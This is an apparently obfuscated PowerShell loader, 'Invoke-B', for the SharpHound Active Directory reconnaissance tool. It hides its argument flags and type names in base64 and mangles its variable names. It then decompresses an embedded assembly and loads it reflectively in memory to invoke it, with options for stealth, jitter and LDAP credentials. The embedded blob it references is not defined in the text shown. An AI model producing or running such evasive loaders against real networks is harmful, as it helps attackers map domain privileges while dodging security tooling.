﻿function Invoke-B{
    [CmdletBinding(PositionalBinding=$false)]
    param(
        [Alias("c")]
        [String[]]
        $CollectionMethod = [String[]] @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGYAYQB1AGwAdAA=')))),
        [Switch]
        $Stealth,
        [Alias("d")]
        [String]
        $Domain,
        [Switch]
        $WindowsOnly,
        [String]
        $ComputerFile,
        [ValidateScript({ Test-Path -Path $_ })]
        [String]
        $OutputDirectory = $(gl),
        [ValidateNotNullOrEmpty()]
        [String]
        $OutputPrefix,
        [Switch]
        $PrettyJson,
        [String]
        $CacheFileName,
        [Switch]
        $RandomizeFilenames,
        [String]
        $ZipFilename,
        [Switch]
        $NoSaveCache,
        [Switch]
        $EncryptZip,
        [Switch]
        $InvalidateCache,
        [String]
        $SearchBase,
        [String]
        $LdapFilter,
        [string]
        $DomainController,
        [ValidateRange(0,65535)]
        [Int]
        $LdapPort,
        [Switch]
        $SecureLdap,
        [Switch]
        $DisableKerberosSigning,
        [String]
        $LdapUsername,
        [String]
        $LdapPassword,
        [Switch]
        $SkipPortScan,
        [ValidateRange(50,5000)]
        [Int]
        $PortScanTimeout = 2000,
        [Switch]
        $ExcludeDomainControllers,
        [ValidateRange(0,100)]
        [Int]
        $Jitter,
        [Int]
        $Throttle,
        [String]
        $OverrideUsername,
        [Switch]
        $NoRegistryLoggedOn,
        [Switch]
        $DumpComputerStatus,
        [String]
        $RealDNSName,
        [Switch]
        $CollectAllProperties,
        [ValidateRange(500,60000)]
        [Int]
        $StatusInterval,
        [Switch]
        $Loop,
        [String]
        $LoopDuration,
        [String]
        $LoopInterval,
        [Switch]
        $V,
        [Alias("h")]
        [Switch]
        $Help,
        [Switch]
        $Version
    )
    ${_/==\/\_/=\_/\_/=} = New-Object System.Collections.Generic.List[System.Object]
    if ($CollectionMethod){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEMAbwBsAGwAZQBjAHQAaQBvAG4ATQBlAHQAaABvAGQA'))));
        foreach (${_/===\_/=\___/\/\} in $CollectionMethod){
            ${_/==\/\_/=\_/\_/=}.Add(${_/===\_/=\___/\/\});
        }
    }
    if ($Domain){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEQAbwBtAGEAaQBuAA=='))));
        ${_/==\/\_/=\_/\_/=}.Add($Domain);
    }
    if ($Stealth){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAFMAdABlAGEAbAB0AGgA'))))
    }
    if ($WindowsOnly){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAFcAaQBuAGQAbwB3AHMATwBuAGwAeQA='))))
    }
    if ($ComputerFile){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEMAbwBtAHAAdQB0AGUAcgBGAGkAbABlAA=='))));
        ${_/==\/\_/=\_/\_/=}.Add($ComputerFile);
    }
    if ($OutputDirectory){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAE8AdQB0AHAAdQB0AEQAaQByAGUAYwB0AG8AcgB5AA=='))));
        ${_/==\/\_/=\_/\_/=}.Add($OutputDirectory);
    }
    if ($OutputPrefix){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAE8AdQB0AHAAdQB0AFAAcgBlAGYAaQB4AA=='))));
        ${_/==\/\_/=\_/\_/=}.Add($OutputPrefix);
    }
    if ($PrettyJson){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAFAAcgBlAHQAdAB5AEoAcwBvAG4A'))));
    }
    if ($CacheFileName){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEMAYQBjAGgAZQBGAGkAbABlAE4AYQBtAGUA'))));
        ${_/==\/\_/=\_/\_/=}.Add($CacheFileName);
    }
     if ($RandomizeFilenames){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAFIAYQBuAGQAbwBtAGkAegBlAEYAaQBsAGUAbgBhAG0AZQBzAA=='))));
    }
    if ($ZipFileName){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAFoAaQBwAEYAaQBsAGUATgBhAG0AZQA='))));
        ${_/==\/\_/=\_/\_/=}.Add($ZipFileName);
    }
    if ($NoSaveCache){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAE4AbwBTAGEAdgBlAEMAYQBjAGgAZQA='))));
    }
    if ($EncryptZip){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEUAbgBjAHIAeQBwAHQAWgBpAHAA'))));
    }
    if ($NoZip){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAE4AbwBaAGkAcAA='))));
    }
    if ($InvalidateCache){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEkAbgB2AGEAbABpAGQAYQB0AGUAQwBhAGMAaABlAA=='))));
    }
    if ($LdapFilter){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEwAZABhAHAARgBpAGwAdABlAHIA'))));
        ${_/==\/\_/=\_/\_/=}.Add($LdapFilter);
    }
    if ($DomainController){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwAbABlAHIA'))));
        ${_/==\/\_/=\_/\_/=}.Add($DomainController);
    }
    if ($LdapPort){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEwAZABhAHAAUABvAHIAdAA='))));
        ${_/==\/\_/=\_/\_/=}.Add($LdapPort);
    }
    if ($SecureLdap){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAFMAZQBjAHUAcgBlAEwAZABhAHAA'))));
    }
    if ($DisableKerberosSigning){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEQAaQBzAGEAYgBsAGUASwBlAHIAYgBlAHIAbwBzAFMAaQBnAG4AaQBuAGcA'))));
    }
    if ($LdapUsername){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEwAZABhAHAAVQBzAGUAcgBuAGEAbQBlAA=='))));
        ${_/==\/\_/=\_/\_/=}.Add($LdapUsername);
    }
    if ($LdapPassword){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEwAZABhAHAAUABhAHMAcwB3AG8AcgBkAA=='))));
        ${_/==\/\_/=\_/\_/=}.Add($LdapPassword);
    }
    if ($SearchBase){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAFMAZQBhAHIAYwBoAEIAYQBzAGUA'))))
        ${_/==\/\_/=\_/\_/=}.Add($SearchBase)
    }
    if ($SkipPortScan){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAFMAawBpAHAAUABvAHIAdABTAGMAYQBuAA=='))));
    }
    if ($PortScanTimeout){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAFAAbwByAHQAUwBjAGEAbgBUAGkAbQBlAG8AdQB0AA=='))))
        ${_/==\/\_/=\_/\_/=}.Add($PortScanTimeout)
    }
    if ($ExcludeDomainControllers){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEUAeABjAGwAdQBkAGUARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcgBzAA=='))))
    }
    if ($Throttle){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAFQAaAByAG8AdAB0AGwAZQA='))));
        ${_/==\/\_/=\_/\_/=}.Add($Throttle);
    }
    if ($Jitter -gt 0){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEoAaQB0AHQAZQByAA=='))));
        ${_/==\/\_/=\_/\_/=}.Add($Jitter);
    }
    if ($OverrideUserName){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAE8AdgBlAHIAcgBpAGQAZQBVAHMAZQByAE4AYQBtAGUA'))))
        ${_/==\/\_/=\_/\_/=}.Add($OverrideUsername)
    }
    if ($NoRegistryLoggedOn){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAE4AbwBSAGUAZwBpAHMAdAByAHkATABvAGcAZwBlAGQATwBuAA=='))))
    }
    if ($DumpComputerStatus){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEQAdQBtAHAAQwBvAG0AcAB1AHQAZQByAFMAdABhAHQAdQBzAA=='))))
    }
    if ($RealDNSName){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAFIAZQBhAGwARABOAFMATgBhAG0AZQA='))))
        ${_/==\/\_/=\_/\_/=}.Add($RealDNSName)
    }
    if ($CollectAllProperties){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEMAbwBsAGwAZQBjAHQAQQBsAGwAUAByAG8AcABlAHIAdABpAGUAcwA='))))
    }
    if ($StatusInterval){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAFMAdABhAHQAdQBzAEkAbgB0AGUAcgB2AGEAbAA='))))
        ${_/==\/\_/=\_/\_/=}.Add($StatusInterval)
    }
    if ($V){
        ${_/==\/\_/=\_/\_/=}.Add("-v");
    }
    if ($Loop){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEwAbwBvAHAA'))))
    }
    if ($LoopDuration){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEwAbwBvAHAARAB1AHIAYQB0AGkAbwBuAA=='))))
        ${_/==\/\_/=\_/\_/=}.Add($LoopDuration)
    }
    if ($LoopInterval){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEwAbwBvAHAASQBuAHQAZQByAHYAYQBsAA=='))))
        ${_/==\/\_/=\_/\_/=}.Add($LoopInterval)
    }
    if ($Help){
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAEgAZQBsAHAA'))));
    }
    if ($Version){
        ${_/==\/\_/=\_/\_/=}.clear();
        ${_/==\/\_/=\_/\_/=}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAFYAZQByAHMAaQBvAG4A'))));
    }
    ${/\____/\____/\/\_} = [string[]]${_/==\/\_/=\_/\_/=}.ToArray()
	${__/==\/\__/\/\_/=} = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(${__/=\/\__/\__/===}),[IO.Compression.CompressionMode]::Decompress)
	${/\____/\__/=\_/==} = New-Object Byte[](833024)
	${__/==\/\__/\/\_/=}.Read(${/\____/\__/=\_/==}, 0, 833024) | Out-Null
	${_/\_/\/==\/\/=\_/} = [Reflection.Assembly]::Load(${/\____/\__/=\_/==})
	${_____/\__/\/==\__} = [Reflection.BindingFlags] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))
	${___/\/==\__/\_/\_} = @()
	${_/\_/\/==\/\/=\_/}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHMAdAB1AHIAYQAuAEEAcwBzAGUAbQBiAGwAeQBMAG8AYQBkAGUAcgA='))), $false).GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAYQBjAGgA'))), ${_____/\__/\/==\__}).Invoke($Null, @())
	${_/\_/\/==\/\/=\_/}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBwAEgAbwB1AG4AZAAzAC4AUwBoAGEAcgBwAEgAbwB1AG4AZAA=')))).GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUAUwBoAGEAcgBwAEgAbwB1AG4AZAA=')))).Invoke($Null, @(,${/\____/\____/\/\_}))
}